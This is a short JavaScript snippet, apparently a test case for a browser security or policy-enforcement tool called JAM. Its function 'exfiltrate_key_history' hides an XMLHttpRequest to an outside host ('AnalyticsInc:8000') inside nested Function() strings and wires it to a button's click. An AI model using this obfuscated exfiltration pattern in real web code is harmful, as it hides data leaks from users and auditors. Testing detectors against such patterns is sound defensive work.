
JAM.startProfile('load');
function exfiltrate_key_history(){var nest='return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');';JAM.call(JAM.call(Function,null,[nest])(),null,[xmlhttp=new XMLHttpRequest])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
